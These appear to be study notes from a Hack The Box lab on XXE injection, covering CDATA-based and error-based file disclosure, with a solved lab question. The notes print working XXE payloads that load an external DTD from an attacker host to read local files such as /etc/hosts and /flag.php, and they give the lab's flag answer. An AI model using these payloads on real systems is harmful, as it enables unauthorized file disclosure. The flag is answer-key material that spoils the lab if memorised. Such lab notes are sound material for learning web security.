# Advanced File Disclosure
## Advanced Exfiltration with CDATA
To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

```shellsession
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

## Error Based XXE
First, we will host a DTD file that contains the following payload:

```shellsession
$ cat xxe.dtd
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now, we can call our external DTD script, and then reference the error entity, as follows:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

## Questions
1. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error'). **Answer: HTB{3rr0r5_c4n_l34k_d474}**
   - Use error based XXE at `/error` path, first host the `xxe.dtd`:
        ```shellsession
        $ cat xxe.dtd
        <!ENTITY % file SYSTEM "file:///flag.php">
        <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
        $ python3 -m http.server 8000
        ```
   - Call the external DTD script and reference the error:
        ```
        POST /error/submitDetails.php HTTP/1.1
        Host: 10.129.234.170
        Content-Length: 109
        Accept-Language: en-US,en;q=0.9
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Content-Type: text/plain;charset=UTF-8
        Accept: */*
        Origin: http://10.129.234.170
        Referer: http://10.129.234.170/error/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        <!DOCTYPE email [ 
        <!ENTITY % remote SYSTEM "http://10.10.14.205:8000/xxe.dtd">
        %remote;
        %error;
        ]>
        ```